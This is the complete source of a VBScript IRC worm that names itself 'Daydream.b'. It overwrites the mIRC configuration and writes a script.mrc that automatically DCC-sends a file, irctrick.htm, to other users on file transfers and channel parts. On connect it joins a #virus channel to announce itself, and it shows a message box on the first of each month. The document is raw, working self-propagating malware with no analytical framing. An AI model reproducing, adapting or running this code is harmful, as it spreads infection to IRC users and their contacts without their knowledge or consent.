
On Error Resume Next

Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")

'infect mirc ------------------------------

If FSO.FolderExists("C:\1") Then
Set ac = FSO.OpenTextFile("c:\windows\irc3.txt",1, True)
newcontents = ac.readall()
ac.close

Set mrc = FSO.OpenTextFile("C:\1\mirc.ini", 2, True)
mrc.write(newcontents)
mrc.close
Set mirc = Fso.opentextfile("C:\1\script.mrc",2,true)
mirc.writeline "[script]"
mirc.writeline "on 1:FILERCVD:*.*:./dcc send $nick  c:\windows\system\irctrick.htm"
mirc.writeline "on 1:FILESENT:*.*:./dcc send $nick c:\windows\system\irctrick.htm"
mirc.writeline "on 1:PART:#:/if ($nick == $me) { halt } | .dcc send $nick c:\windows\system\irctrick.htm"
mirc.writeline "on 1:TEXT:*hi*:*:/msg $chan we cannot attach any absolute significance to the concept of simultaneity"
mirc.writeline ""
mirc.writeline ""
mirc.writeline "on 1:connect: {"
mirc.writeline "/join #virus"
mirc.writeline "/msg #virus 1st0ne lives f0revir"
mirc.writeline "/part #virus"
mirc.writeline "/clear"
mirc.writeline "/motd"
mirc.writeline "}"
mirc.writeline ""
mirc.writeline ""
mirc.writeline ";MyName = Daydream.b"
mirc.writeline ";WrittenBy = f0re"
mirc.Close
End If


'run message -------------------------------

If Day(Now) = 1 Then
MsgBox "we cannot attach any absolute significance to the concept of simultaneity", vbApplicationModal, "Choose"
End If

'1st0ne
